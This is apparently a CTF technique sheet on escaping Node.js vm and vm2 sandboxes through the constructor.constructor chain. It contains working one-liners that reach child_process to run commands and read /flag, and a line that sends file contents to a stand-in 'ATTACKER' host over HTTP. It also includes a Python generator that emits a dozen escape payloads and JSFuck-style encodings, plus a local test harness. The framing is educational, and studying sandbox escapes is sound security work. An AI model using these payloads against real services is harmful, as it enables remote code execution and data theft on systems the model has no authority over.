---
title: "JavaScript / Node Sandbox Escape"
category: misc
subcategory: js-jail
type: technique
tags: [nodejs, vm, vm2, sandbox-escape, jail-escape, prototype-chain, constructor-constructor, process-mainmodule, child-process, isolated-vm, jsfuck, prepare-stack-trace, proxy, require, eval]
difficulty: medium
summary: "Node's vm module is not a security boundary: any host object leaked into the sandbox reaches Function and therefore process."
when_to_use:
  - "A challenge runs your JavaScript with `vm.runInNewContext` or vm2"
  - "You can define an object whose method the host calls"
  - "A template engine or JSON-based eval accepts arbitrary expressions"
  - "Characters are restricted to a tiny alphabet (JSFuck-style)"
tools: [node, python3, vm2, isolated-vm]
related: [python-jail-escape, eval-jail-generic, jail-escape-payloads, hunt-nodejs, ctf-general-cheatsheet]
---

## TL;DR

In Node, `this.constructor.constructor("return process")()` turns any object reachable in the
sandbox into a `Function` constructor call in the **host** realm, which hands you `process`,
`require` and therefore `child_process`. `vm` was never a security boundary; `vm2` tried to be
one and repeatedly failed; `isolated-vm` is the only mainstream option that actually isolates.

## Recognise it

```javascript
// the vulnerable pattern
const vm = require('vm');
const result = vm.runInNewContext(userInput, { /* "safe" globals */ }, { timeout: 1000 });
```

- `vm.runInNewContext` / `vm.runInContext` / `new vm.Script(...)`.
- `vm2`'s `new VM()` or `new NodeVM()` (deprecated and known-broken).
- A "calculator" that `eval`s an expression.
- A template engine (`ejs`, `pug`, `handlebars` with helpers) rendering user data.
- Any sandbox that passes a *host* object (an array, a console, an error, a callback) into the
  guest context.

## Theory

### The constructor chain

Every JS value has a prototype chain ending at `Object.prototype`. `constructor` on any object
yields its class; `constructor.constructor` yields `Function`. Calling `Function(body)` compiles
code **in the realm where that Function object lives**. If the object came from the host, you
just escaped:

```javascript
this.constructor.constructor('return process')()
''.constructor.constructor('return process')()
[].constructor.constructor('return process')()
({}).constructor.constructor('return process')()
(function(){}).constructor('return process')()
```

Inside `vm.runInNewContext` the contextified globals are new objects in the *guest* realm, so
`''.constructor` is the guest's `String`. That is why the plain `vm` module needs a **leaked
host object**: an argument the host passes to your callback, `arguments.callee.caller`, or an
object the sandbox config handed in by reference.

### Reaching process without `process`

```javascript
// 1. straight from a host Function
const p = this.constructor.constructor('return process')();
p.mainModule.require('child_process').execSync('id').toString();

// 2. process.binding is lower level and sometimes un-blacklisted
p.binding('spawn_sync');

// 3. global getters
Object.getOwnPropertyNames(globalThis);
globalThis.process ?? global.process;

// 4. require recovery when `require` is shadowed
process.mainModule.require('child_process')
module.constructor._load('child_process')
require('module')._load('child_process')
```

### vm2 escapes (historical, and the reason vm2 is deprecated)

vm2 proxied every host object crossing the boundary. Bugs repeatedly allowed the raw host
object through:

- **Error.prepareStackTrace**: the host calls this with *host* `CallSite` objects, so setting
  it inside the sandbox and then triggering a stack capture leaks host objects.
- **Proxy traps**: `getPrototypeOf`/`getOwnPropertyDescriptor` traps that vm2's membrane invoked
  with host arguments.
- **`Reflect` and the `host` object reference** kept on internal helpers.
- **async/`Promise` callbacks** executed by the host scheduler.
- **`Symbol.toPrimitive`/`toString` coercion** invoked by host code on guest objects.

The shape is always the same: get host code to call *your* function, and grab the `this` or an
argument, which is a host object, then apply the constructor chain to it.

```javascript
// prepareStackTrace-shaped escape (illustrative)
Error.prepareStackTrace = (err, frames) => {
  const host = frames[0].getThis();        // a host object
  return host.constructor.constructor('return process')();
};
const proc = new Error().stack;            // triggers prepareStackTrace
proc.mainModule.require('child_process').execSync('id');
```

Whether a specific payload works depends entirely on the vm2 version; enumerate what leaks
rather than pasting a payload blindly.

### Browser-side and pure-JS jails

- `eval`, `new Function`, `setTimeout("code")`, `Function.constructor` are the call primitives.
- Template literals call functions: <code>fn\`x\`</code>.
- Optional chaining, `?.`, `??`, and getters can hide calls from naive parsers.
- **JSFuck**: every JS program can be written with only `[]()!+`. `[]` is an array, `+[]` is 0,
  `![]` is false, `!![]` is true, `+!![]` is 1, `[][[]]` is undefined; string characters are
  sliced out of the string forms of these values (`"false"`, `"true"`, `"undefined"`,
  `"[object Object]"`, `"NaN"`, `"Infinity"`, `"function"`). With `f`, `u`, `n`, `c`, `t`, `i`,
  `o` and `n` you spell `constructor`, reach `Function`, and run anything.

## Attack

```javascript
// 1. what do I have?
Object.getOwnPropertyNames(globalThis).join(',')
typeof process, typeof require, typeof global, typeof module
this.constructor.name
Object.getPrototypeOf(this)

// 2. the one-liners, in order of likelihood
this.constructor.constructor('return process')().mainModule.require('child_process').execSync('id').toString()
''.constructor.constructor('return process.env')()
(function(){}).constructor('return this')().process
global.process.mainModule.require('child_process').execSync('cat /flag').toString()

// 3. read a file without child_process
process.binding('fs')
this.constructor.constructor('return process')().mainModule.require('fs').readFileSync('/flag','utf8')

// 4. if output is swallowed, exfiltrate
this.constructor.constructor('return process')().mainModule.require('http')
  .get('http://ATTACKER/?d='+encodeURIComponent(require('fs').readFileSync('/flag','utf8')))

// 5. if only a single expression is allowed
[].constructor.constructor('return process.mainModule.require("child_process").execSync("id")+""')()
```

## Code

```python
#!/usr/bin/env python3
"""Generate JS sandbox-escape payloads, including a minimal-charset (JSFuck-style) encoder.

  python3 jsjail.py payloads "id"
  python3 jsjail.py jsfuck "alert(1)"
  python3 jsjail.py --selftest
"""
from __future__ import annotations

import json
import sys

# Building blocks that need only [ ] ( ) ! +
ZERO = "+[]"
ONE = "+!![]"
FALSE = "![]"
TRUE = "!![]"
UNDEF = "[][[]]"
EMPTY_STR = "[]+[]"


def number(n: int) -> str:
    """n as a sum of +!![] terms (0 is +[]). Concatenation, not join: '+!![]' already
    carries its own leading '+', so '+!![]+!![]' evaluates to 2."""
    if n == 0:
        return ZERO
    return ONE * n


def index(expr: str, n: int) -> str:
    return f"({expr})[{number(n)}]"


# Each entry maps a JS expression to the string it stringifies to.
# Alphabet used: [ ] ( ) ! + { } - one character more than classic JSFuck, which pays for
# itself by making the encoder short enough to read.
_SOURCES: dict[str, str] = {
    "false": f"({FALSE}+[])",
    "true": f"({TRUE}+[])",
    "undefined": f"({UNDEF}+[])",
    "NaN": "(+[![]]+[])",
    "[object Object]": "([]+{})",
}
ALPHABET = set("[]()!+{} ")

CHAR_MAP: dict[str, tuple[str, int]] = {}
for _word, _expr in _SOURCES.items():
    for _i, _c in enumerate(_word):
        CHAR_MAP.setdefault(_c, (_expr, _i))


def char(c: str) -> str | None:
    """An expression for a single character, using only the restricted alphabet."""
    hit = CHAR_MAP.get(c)
    if hit is None:
        return None
    expr, i = hit
    return index(expr, i)


def string_expr(s: str) -> str | None:
    parts = []
    for c in s:
        e = char(c)
        if e is None:
            return None
        parts.append(e)
    return "+".join(parts) if parts else EMPTY_STR


def jsfuck_available_chars() -> str:
    return "".join(sorted(CHAR_MAP))


ESCAPES = [
    ("host Function via this",
     "this.constructor.constructor('return process')()"
     ".mainModule.require('child_process').execSync({cmd}).toString()"),
    ("host Function via a string literal",
     "''.constructor.constructor('return process')()"
     ".mainModule.require('child_process').execSync({cmd}).toString()"),
    ("host Function via an array",
     "[].constructor.constructor('return process')()"
     ".mainModule.require('child_process').execSync({cmd}).toString()"),
    ("host Function via a function expression",
     "(function(){{}}).constructor('return process')()"
     ".mainModule.require('child_process').execSync({cmd}).toString()"),
    ("global.process when the sandbox forgot to strip it",
     "global.process.mainModule.require('child_process').execSync({cmd}).toString()"),
    ("environment dump only",
     "this.constructor.constructor('return process.env')()"),
    ("file read without child_process",
     "this.constructor.constructor('return process')()"
     ".mainModule.require('fs').readFileSync('/flag','utf8')"),
    ("module._load when require is shadowed",
     "this.constructor.constructor("
     "'return module.constructor._load(\"child_process\").execSync({cmd_raw})')()"),
    ("process.binding, lower level than require",
     "this.constructor.constructor('return process')().binding('spawn_sync')"),
    ("exfiltrate over http when stdout is swallowed",
     "this.constructor.constructor('return process')().mainModule.require('http')"
     ".get('http://127.0.0.1:8000/?d='+encodeURIComponent("
     "this.constructor.constructor('return process')().mainModule"
     ".require('fs').readFileSync('/flag','utf8')))"),
    ("prepareStackTrace host-object leak (vm2-shaped)",
     "Error.prepareStackTrace=(e,f)=>f[0].getThis()"
     ".constructor.constructor('return process')();new Error().stack"),
    ("async callback leak",
     "Promise.resolve().then(function(){{return this}})"),
]


def payloads(cmd: str = "id") -> list[tuple[str, str]]:
    q = json.dumps(cmd)
    out = []
    for label, tmpl in ESCAPES:
        out.append((label, tmpl.format(cmd=q, cmd_raw=q.replace('"', '\\"'))))
    return out


def _selftest() -> None:
    # numeric construction
    assert number(0) == "+[]"
    assert number(3) == "+!![]+!![]+!![]"

    # character extraction table covers the letters needed for 'constructor'
    needed = set("constructor")
    have = set(jsfuck_available_chars())
    missing = needed - have
    assert not missing, f"cannot build these characters: {sorted(missing)}"
    expr = string_expr("constructor")
    assert expr is not None
    assert set(expr) <= ALPHABET, sorted(set(expr) - ALPHABET)

    # every table entry really points at the character it claims
    for c, (src_expr, i) in CHAR_MAP.items():
        word = next(w for w, e in _SOURCES.items() if e == src_expr)
        assert word[i] == c, (c, word, i)

    # payload templates format cleanly and contain the escape primitive
    ps = payloads("cat /flag")
    assert len(ps) >= 10
    for label, p in ps:
        assert "{cmd}" not in p and "{cmd_raw}" not in p, (label, p)
        assert "cat /flag" in p or "process" in p or "Promise" in p, (label, p)
    assert any("constructor.constructor" in p for _l, p in ps)

    # json quoting protects a command containing quotes
    tricky = payloads("echo \"a'b\"")[0][1]
    assert "\\\"" in tricky or "'" in tricky
    print(f"selftest ok: {len(ps)} payloads, {len(CHAR_MAP)} JSFuck characters "
          f"({''.join(sorted(have))})")


def main() -> int:
    if len(sys.argv) < 2 or sys.argv[1] == "--selftest":
        _selftest()
        return 0
    if sys.argv[1] == "payloads":
        cmd = sys.argv[2] if len(sys.argv) > 2 else "id"
        for label, p in payloads(cmd):
            print(f"// {label}\n{p}\n")
    elif sys.argv[1] == "jsfuck":
        e = string_expr(sys.argv[2])
        print(e if e else "[-] some characters are not in the minimal source table")
    elif sys.argv[1] == "chars":
        print(jsfuck_available_chars())
    else:
        print(__doc__)
        return 1
    return 0


if __name__ == "__main__":
    sys.exit(main())
```

Run the generated payloads against a local reproduction before firing them at the challenge:

```javascript
// save as repro.js and run: node repro.js "PAYLOAD"
const vm = require('vm');
const payload = process.argv[2];
const sandbox = { console };                 // note: `console` is a HOST object - leaked!
try {
  console.log(vm.runInNewContext(payload, vm.createContext(sandbox), { timeout: 2000 }));
} catch (e) {
  console.log('ERR', e.message);
}
```

## Variants and pitfalls

- **`vm` is documented as not a security mechanism.** The Node docs say so explicitly. If the
  challenge uses `vm` alone, assume an escape exists and hunt for the leaked host object.
- **A pure `vm.runInNewContext` with an empty sandbox is harder** than it looks: the contextified
  globals are guest objects, so `''.constructor.constructor` gives you the *guest* Function.
  You need something from the host: a passed-in object, a callback, an `Error` created outside,
  or a prototype the host mutated.
- **`vm2` is deprecated and unmaintained.** Version-specific escapes exist; check the version
  (`require('vm2/package.json').version`) and match the technique to it rather than guessing.
- **`isolated-vm` really does isolate** (separate V8 isolate, no shared objects). If the
  challenge uses it, the bug is in the bridge code, not in the sandbox.
- **Timeouts** in `vm` only interrupt synchronous code; a pending Promise or a `setTimeout`
  escapes the timer.
- **`Function` may be blacklisted by name** - reach it as `constructor.constructor`, as
  `Object.getPrototypeOf(()=>{}).constructor`, or via `Reflect.construct`.
- **Blacklists on the string `process`** - build it: `['p','r','o','c','e','s','s'].join('')`,
  `String.fromCharCode(112,...)`, or `globalThis['pro'+'cess']`.
- **`require` is not a global in ESM.** Use `process.mainModule.require` or
  `createRequire(import.meta.url)`.
- **`child_process` blocked but `fs` allowed** is common; a file read is usually enough for a
  flag.
- **Output**: if the return value is swallowed, `throw` your result - the error message is
  usually printed.

## Tools

`node` (match the challenge's major version), `npm ls vm2` to identify the version,
`isolated-vm` for comparison, a browser console for the pure-JS jails.

## References

- Node.js documentation for the `vm` module, including its explicit "not a security mechanism"
  warning: https://nodejs.org/api/vm.html
- The `vm2` project README (archived/deprecated) documents that it should no longer be used as
  a security boundary.
- ECMAScript specification, "Function.prototype.constructor" and the prototype chain semantics
  that make `constructor.constructor` work.
